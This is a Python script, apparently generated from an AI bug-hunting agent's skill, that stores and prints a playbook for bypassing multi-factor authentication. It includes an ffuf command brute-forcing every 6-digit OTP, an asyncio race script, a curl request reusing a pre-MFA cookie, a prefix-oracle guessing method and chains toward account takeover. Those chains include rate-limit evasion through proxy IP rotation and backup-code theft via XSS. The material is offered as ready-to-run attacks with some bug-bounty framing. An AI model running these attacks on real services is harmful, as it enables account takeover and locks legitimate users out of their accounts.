#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-mfa-bypass

Skill: Test with ffuf — all 1M 6-digit codes
Desc : Hunt MFA / 2FA bypass — 7 distinct patterns. (1) MFA not enforced on sensitive endpoints (password change, email change accept without MFA challenge), (2) MFA-step skip via direct navigation to post-login URL, (3) MFA-token replay (same code accepted twice), (4) brute-force the 6-digit OTP without rate limit (10^6 attempts at server speed), (5) race condition on OTP validation, (6) recovery-code dump via /api/me, (7) backup factor downgrade (SMS factor with no rate limit). Plus the chain: cookie theft + password oracle + no step-up = ATO without MFA challenge. Detection: trace auth flow in Burp, find every state transition, check if MFA is middleware-gated vs per-endpoint, check OTP entropy and rate limit on OTP-validate. Validate: attacker session reaching post-MFA state. Use when hunting auth bypass, MFA flows, chaining primitives toward ATO.

Run:  python claude-bughunter-hunt-mfa-bypass.py --help
      python claude-bughunter-hunt-mfa-bypass.py --list
      python claude-bughunter-hunt-mfa-bypass.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-mfa-bypass'
TITLE = 'Test with ffuf — all 1M 6-digit codes'
DESCRIPTION = 'Hunt MFA / 2FA bypass — 7 distinct patterns. (1) MFA not enforced on sensitive endpoints (password change, email change accept without MFA challenge), (2) MFA-step skip via direct navigation to post-login URL, (3) MFA-token replay (same code accepted twice), (4) brute-force the 6-digit OTP without rate limit (10^6 attempts at server speed), (5) race condition on OTP validation, (6) recovery-code dump via /api/me, (7) backup factor downgrade (SMS factor with no rate limit). Plus the chain: cookie theft + password oracle + no step-up = ATO without MFA challenge. Detection: trace auth flow in Burp, find every state transition, check if MFA is middleware-gated vs per-endpoint, check OTP entropy and rate limit on OTP-validate. Validate: attacker session reaching post-MFA state. Use when hunting auth bypass, MFA flows, chaining primitives toward ATO.'

PAYLOADS = {
    'main': ["name: hunt-mfa-bypass", "description: \"Hunt MFA / 2FA bypass \u2014 7 distinct patterns. (1) MFA not enforced on sensitive endpoints (password change, email change accept without MFA challenge), (2) MFA-step skip via direct navigation to post-login URL, (3) MFA-token replay (same code accepted twice), (4) brute-force the 6-digit OTP without rate limit (10^6 attempts at server speed), (5) race condition on OTP validation, (6) recovery-code dump via /api/me, (7) backup factor downgrade (SMS factor with no rate limit). Plus the chain: cookie theft + password oracle + no step-up = ATO without MFA challenge. Detection: trace auth flow in Burp, find every state transition, check if MFA is middleware-gated vs per-endpoint, check OTP entropy and rate limit on OTP-validate. Validate: attacker session reaching post-MFA state. Use when hunting auth bypass, MFA flows, chaining primitives toward ATO.\""],
    'autonomous-testing-priority': ["**Try workflow bypasses before brute force \u2014 they're faster and more likely to succeed.**", "**Pattern 1 \u2014 Skip the MFA step entirely (most automatable):**", "1. Login with valid credentials \u2192 receive a \"pre-MFA\" session state", "2. Without completing MFA, directly access a protected resource (`/dashboard`, `/api/me`, `/account/profile`)", "3. If the response returns user data \u2192 MFA is enforced only in the UI, not server-side = Critical", "**Pattern 2 \u2014 OTP replay (reuse a consumed code):**", "1. Complete a valid MFA flow to get a working OTP", "2. Log out, log in again with the same credentials", "3. Submit the same OTP again", "4. If accepted \u2192 OTP is not invalidated after use", "**Pattern 3 \u2014 Submit obviously wrong OTP, observe response:**", "Try submitting `000000` or `123456`. If the response is 200 or returns a session token, OTP validation is broken or client-side only.", "**Pattern 4 \u2014 Partial / incremental validation (prefix oracle):**", "If a guessed full code is rejected, test whether the server validates the OTP **prefix-by-prefix** instead of all-or-nothing. Submit a short partial code and compare responses:", "1. Submit a 1\u20133 digit value (e.g. `otp=1`, then `otp=12`, \u2026) \u2014 for a POST verify endpoint the code goes in the **request body**, not the URL query string, or the server reads an empty value.", "2. If a *correct* prefix gives a DIFFERENT response than a wrong one (a success/flag, a distinct message, or a different length/timing), the validator leaks correctness one chunk at a time.", "3. Walk the code digit-by-digit: keep the prefix that \"responds correct,\" append 0\u20139, repeat. This collapses 10^6 brute force to ~10\u00d7N guesses (\u226460 for a 6-digit code) \u2014 very feasible in a bounded test.", "This is the go-to when there is no leaked code and no skip/replay path. Some apps award success on *any* correct prefix outright (so a single correct first digit can win \u2014 sweep `otp=0,1,\u2026,9` before giving up).", "**CRITICAL \u2014 stay in ONE session:** re-authenticating (POST /\u2026/login again) regenerates the OTP, throwing away your prefix progress. Do the entire sweep against a single established MFA session; never re-login between guesses.", "**On full brute force:** brute-forcing all 10^6 codes is infeasible in a bounded test \u2014 but the prefix oracle above (Pattern 4) usually makes it unnecessary. Only attempt full brute force with evidence of no rate limit AND a small key space.", "**Proof:** A session token or protected resource data in the response without completing MFA confirms the bypass."],
    '19-mfa-2fa-bypass': [],
    'pattern-1-no-rate-limit-on-otp': ["```bash"],
    'test-with-ffuf-all-1m-6-digit-codes': ["ffuf -u \"https://target.com/api/verify-otp\" \\", "-X POST -H \"Content-Type: application/json\" \\", "-H \"Cookie: session=YOUR_SESSION\" \\", "-d '{\"otp\":\"FUZZ\"}' \\", "-w <(seq -w 000000 999999) \\", "-fc 400,429 -t 5"],
    't-5-slow-down-aggressive-rates-get-429-or-ban': [],
    'pattern-2-otp-not-invalidated-after-use': ["1. Login \u2192 receive OTP \"123456\" \u2192 enter it \u2192 success", "2. Logout \u2192 login again with same credentials", "3. Try OTP \"123456\" again", "4. If accepted \u2192 OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)"],
    'pattern-3-response-manipulation': ["1. Enter wrong OTP \u2192 capture response in Burp", "2. Change {\"success\":false} \u2192 {\"success\":true} (or 401 \u2192 200)", "3. Forward \u2192 if app proceeds \u2192 client-side only MFA check"],
    'pattern-4-skip-mfa-step-workflow-bypass': ["```bash"],
    'after-entering-password-app-sets-a-pre-mfa-cookie-redirects-to-mfa': [],
    'test-skip-mfa-entirely-access-dashboard-directly-with-pre-mfa-cookie': [],
    'if-app-grants-access-without-mfa-auth-flow-bypass-critical': ["curl -s -b \"session=PRE_MFA_SESSION\" https://target.com/dashboard"],
    'pattern-5-race-on-mfa-verification': ["```python", "import asyncio, aiohttp", "async def verify(session, otp):", "async with session.post(\"https://target.com/api/mfa/verify\",", "json={\"otp\": otp}) as r:", "return r.status, await r.text()", "async def race():", "cookies = {\"session\": \"YOUR_SESSION\"}", "async with aiohttp.ClientSession(cookies=cookies) as s:", "results = await asyncio.gather(*[verify(s, \"123456\") for _ in range(30)])", "for status, body in results:", "print(status, body)", "asyncio.run(race())"],
    'pattern-6-backup-code-brute-force': ["Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)", "BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit", "Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably."],
    'pattern-7-remember-this-device-trust-escalation': ["1. Complete MFA once on Device A (attacker's browser)", "2. Capture the \"remember device\" cookie", "3. Present that cookie from a new IP/browser", "4. If MFA skipped = device trust not bound to IP/UA = ATO from any location"],
    'mfa-chain-escalation': ["Rate limit bypass + no lockout = ATO (Critical)", "Response manipulation = client-side only check = Critical", "Skip MFA step = auth flow bypass = Critical", "OTP reuse = persistent session hijack = High"],
    'related-skills-chains': ["- **`hunt-ato`** \u2014 MFA bypass is a primitive; ATO is the destination. Chain primitive: cookie theft (via XSS or session-fixation) + password oracle (login response timing/length diff reveals valid passwords without lockout) + no MFA step-up on password-change endpoint = persistent ATO without ever facing the OTP challenge \u2192 password rotated, attacker locks victim out.", "- **`hunt-race-condition`** \u2014 Pattern 5 (OTP race) lives in race-condition territory; load both skills together. Chain primitive: same 6-digit OTP submitted via 20 parallel HTTP/2 streams (single-packet Turbo Intruder attack) before the server marks it used \u2192 1 success + 19 \"already-used\" \u2192 race window confirmed \u2192 attacker doesn't need to brute, just guesses once and parallelizes \u2192 ATO.", "- **`hunt-auth-bypass`** \u2014 MFA-step-skip is auth-flow bypass at the workflow layer. Chain primitive: pre-MFA cookie issued after password step + direct navigation to `/dashboard` skipping `/mfa` route + server only middleware-gates `/mfa` not `/dashboard` = full post-auth access from password-only state \u2192 MFA never enforced because the route gate was misplaced.", "- **`hunt-misc`** \u2014 Recovery-code dump via `/api/me` is a misc-class info disclosure that becomes Critical when chained. Chain primitive: `/api/me` returns full user object including `backup_codes` array (plaintext, never rotated) \u2192 attacker with any read-IDOR or XSS exfils backup codes \u2192 uses one backup code \u2192 MFA satisfied \u2192 ATO without OTP knowledge.", "- **`security-arsenal`** \u2014 Pull the OTP-brute-force payload section (000000-999999 wordlist generator, ffuf rate-limit-evasion patterns with `-t 5 -p 0.5-2`, distributed-IP rotation via proxychains) and the JWT-token-replay table when \"MFA satisfied\" claim lives in a JWT claim that can be forged.", "- **`triage-validation`** \u2014 Run the Pre-Severity Gate before claiming Critical on an MFA bypass that only works when the attacker already has the password. Standalone MFA bypass is High; chained-with-password-oracle is Critical; chained-with-cookie-theft-only is Critical. The chain question separates the two."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()